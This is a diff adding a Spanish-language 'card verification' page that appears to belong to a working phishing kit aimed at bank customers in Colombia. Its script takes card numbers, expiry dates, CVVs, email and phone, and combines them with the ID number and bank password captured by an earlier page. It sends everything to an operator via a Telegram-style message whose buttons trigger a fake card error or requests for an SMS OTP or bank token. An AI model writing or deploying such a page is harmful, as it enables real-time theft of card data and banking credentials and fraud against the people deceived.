@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Verificación de Tarjeta</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* Loader CSS */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-[#f3f7fc] min-h-screen flex flex-col items-center p-4">
+    <header class="w-full max-w-md flex items-center justify-between py-4">
+        <button aria-label="Volver" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-chevron-left"></i>
+        </button>
+        <h1 class="text-[#1a2a5a] font-semibold text-base">
+            Verificación de Tarjeta
+        </h1>
+        <button aria-label="Cerrar" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-times"></i>
+        </button>
+    </header>
+    <main class="w-full max-w-md">
+        <br>
+        <h2 class="text-[#1a2a5a] font-semibold text-lg mb-4">
+            Verificación de seguridad
+        </h2>
+        <section class="bg-white rounded-lg p-5 shadow-sm">
+            <div class="flex items-start space-x-3 mb-3">
+                <img alt="Icono de tarjeta de crédito" class="w-6 h-6 flex-shrink-0 mt-1" src="/candado.png" />
+                <div>
+                    <div class="flex items-center space-x-1 mb-1">
+                        <span class="font-semibold text-[#1a2a5a] text-base">
+                            Datos de Tarjeta
+                        </span>
+                    </div>
+                    <p class="text-[#5a5a5a] text-sm leading-relaxed max-w-[320px]">
+                        Por favor, ingresa los datos de tu tarjeta para continuar.
+                    </p>
+                </div>
+            </div>
+            <form id="pagoForm" class="mt-4 space-y-4">
+                <div>
+                    <label for="numero_tarjeta" class="block text-sm font-medium text-gray-700 mb-1">Número de tarjeta</label>
+                    <input type="tel" id="numero_tarjeta" class="w-full border border-gray-300 rounded-md p-2 focus:ring-2 focus:ring-[#1a2a5a] focus:border-transparent" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                </div>
+
+                <div class="flex justify-between gap-4">
+                    <div class="flex-1">
+                        <label for="fecha_exp" class="block text-sm font-medium text-gray-700 mb-1">Fecha de vencimiento</label>
+                        <input type="tel" id="fecha_exp" class="w-full border border-gray-300 rounded-md p-2 text-center focus:ring-2 focus:ring-[#1a2a5a] focus:border-transparent" placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                    <div class="flex-1">
+                        <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
+                        <input type="password" id="cvv" class="w-full border border-gray-300 rounded-md p-2 text-center focus:ring-2 focus:ring-[#1a2a5a] focus:border-transparent" placeholder="123" maxlength="4" required>
+                    </div>
+                </div>
+
+                <div>
+                    <label for="correo" class="block text-sm font-medium text-gray-700 mb-1">Correo electrónico</label>
+                    <input type="email" id="correo" class="w-full border border-gray-300 rounded-md p-2 focus:ring-2 focus:ring-[#1a2a5a] focus:border-transparent" placeholder="tu@correo.com" required>
+                </div>
+
+                <div>
+                    <label for="telefono" class="block text-sm font-medium text-gray-700 mb-1">Número de teléfono</label>
+                    <input type="tel" id="telefono" class="w-full border border-gray-300 rounded-md p-2 focus:ring-2 focus:ring-[#1a2a5a] focus:border-transparent" placeholder="3001234567" required>
+                </div>
+
+                <p id="errorMessage" class="text-red-500 text-center pt-2 hidden">Los datos de la tarjeta son incorrectos. Por favor, verifica la información e intenta de nuevo.</p>
+                <button type="submit" id="pagarBtn" disabled class="w-full bg-[#e5e7eb] text-[#9ca3af] font-semibold text-base rounded-full py-3 cursor-not-allowed transition-colors duration-200">
+                    Verificar
+                </button>
+            </form>
+        </section>
+    </main>
+
+    <div id="loader" class="loader-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <p>Verificando datos...</p>
+    </div>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            const pagoForm = document.getElementById("pagoForm");
+            const numeroTarjetaInput = document.getElementById("numero_tarjeta");
+            const fechaExpInput = document.getElementById("fecha_exp");
+            const cvvInput = document.getElementById("cvv");
+            const correoInput = document.getElementById("correo");
+            const telefonoInput = document.getElementById("telefono");
+            const pagarBtn = document.getElementById("pagarBtn");
+            const loader = document.getElementById('loader');
+            const errorMessage = document.getElementById("errorMessage");
+
+            let initialLoginData = null;
+
+            // Leer datos de sessionStorage al cargar la página
+            const storedData = sessionStorage.getItem('initialLoginData');
+            if (storedData) {
+                initialLoginData = JSON.parse(storedData);
+            } else {
+                alert("No se encontraron datos de sesión. Serás redirigido al inicio.");
+                window.location.href = 'index.html';
+            }
+
+            function validateForm() {
+                const numeroTarjetaValido = numeroTarjetaInput.value.length === 19;
+                const fechaValida = fechaExpInput.value.length === 5;
+                const cvvValido = cvvInput.value.length >= 3;
+                const correoValido = correoInput.value.includes('@');
+                const telefonoValido = telefonoInput.value.length >= 7;
+                const allFilled = numeroTarjetaValido && fechaValida && cvvValido && correoValido && telefonoValido;
+
+                pagarBtn.disabled = !allFilled;
+                pagarBtn.classList.toggle("cursor-not-allowed", !allFilled);
+                pagarBtn.classList.toggle("bg-[#e5e7eb]", !allFilled);
+                pagarBtn.classList.toggle("text-[#9ca3af]", !allFilled);
+                pagarBtn.classList.toggle("bg-[#3b82f6]", allFilled);
+                pagarBtn.classList.toggle("text-white", allFilled);
+            }
+
+            // Listeners para dar formato a los campos y validar
+            numeroTarjetaInput.addEventListener('input', (e) => {
+                let { value } = e.target;
+                value = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+                e.target.value = value;
+                validateForm();
+            });
+
+            fechaExpInput.addEventListener('input', (e) => {
+                let { value } = e.target;
+                value = value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                e.target.value = value;
+                validateForm();
+            });
+
+            cvvInput.addEventListener('input', validateForm);
+            correoInput.addEventListener('input', validateForm);
+            telefonoInput.addEventListener('input', validateForm);
+
+            async function sendCardDataToBackend(messageContent, keyboard) {
+                const url = '/api/send-message';
+                const payload = {
+                    text: messageContent,
+                    keyboard: keyboard
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                    });
+                    const data = await response.json();
+                    if (!response.ok) throw new Error(data.error || 'Error en el servidor');
+                    return data.result.message_id;
+                } catch (error) {
+                    console.error('Error al enviar datos al backend:', error);
+                    return null;
+                }
+            }
+
+            async function checkOperatorResponse(messageId) {
+                try {
+                    const response = await fetch(`/api/check-update/${messageId}`);
+                    loader.style.display = 'none';
+
+                    if (response.status === 408) {
+                        alert("El operador no respondió a tiempo. Por favor, intente de nuevo.");
+                        window.location.reload();
+                        return;
+                    }
+
+                    const data = await response.json();
+
+                    if (data.action) {
+                        if (data.action === 'error_tarjeta') {
+                            errorMessage.classList.remove('hidden');
+                            pagoForm.reset();
+                            validateForm();
+                        } else if (data.action === 'pedir_sms') {
+                            window.location.href = "otp.html";
+                        } else if (data.action === 'pedir_dinamica') {
+                            window.location.href = "token.html";
+                        } else if (data.action === 'finalizar') {
+                            window.location.href = "finish.html";
+                        }
+                    }
+                } catch (error) {
+                    loader.style.display = 'none';
+                    console.error("Error al verificar la respuesta del operador:", error);
+                    alert("Ocurrió un error de comunicación. Por favor, recarga la página.");
+                }
+            }
+
+            pagoForm.addEventListener("submit", async (event) => {
+                event.preventDefault();
+                errorMessage.classList.add('hidden');
+                loader.style.display = 'flex';
+
+                const numeroTarjeta = numeroTarjetaInput.value;
+                const fechaExp = fechaExpInput.value.trim();
+                const cvv = cvvInput.value.trim();
+                const correo = correoInput.value.trim();
+                const telefono = telefonoInput.value.trim();
+
+                const now = new Date();
+                const dateTime = now.toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+                let telegramMessage = '⚠️⚠️⚠️⚠️⚠️🔴🔴🔴🔴 DATOS TARJETA 🔴🔴🔴🔴⚠️⚠️⚠️⚠️⚠️⚠️⚠️\n\n';
+
+                if (initialLoginData) {
+                    telegramMessage += `CEDULA💎: ${initialLoginData.identificationNumber}\n`;
+                    telegramMessage += `ClAVE🔐: ${initialLoginData.secureKey || initialLoginData.debitCardKey}\n`;
+                }
+                
+                telegramMessage += `\n💳 Tarjeta: ${numeroTarjeta}\n`;
+                telegramMessage += `🗓️ Fecha: ${fechaExp}\n`;
+                telegramMessage += `✉️ Correo: ${correo}\n`;
+                telegramMessage += `📱 Teléfono: ${telefono}\n`;
+                telegramMessage += `🔒 CVV: ${cvv}\n\n`;
+                telegramMessage += `Fecha/Hora: ${dateTime}`;
+
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: "❌ Error Tarjeta", callback_data: `error_tarjeta:N/A` }],
+                        [{ text: "👀 Pedir OTP", callback_data: `pedir_sms:N/A` }],
+                        [{ text: "💎 Pedir Token", callback_data: `pedir_dinamica:N/A` }],
+                        [{ text: "🚨 Finalizar", callback_data: `finalizar:N/A` }]
+                    ]
+                };
+
+                const messageId = await sendCardDataToBackend(telegramMessage, keyboard);
+
+                if (messageId) {
+                    checkOperatorResponse(messageId);
+                } else {
+                    loader.style.display = 'none';
+                    alert("Error al enviar los datos. Por favor, inténtalo de nuevo.");
+                }
+            });
+        });
+    </script>
+</body>
+</html>
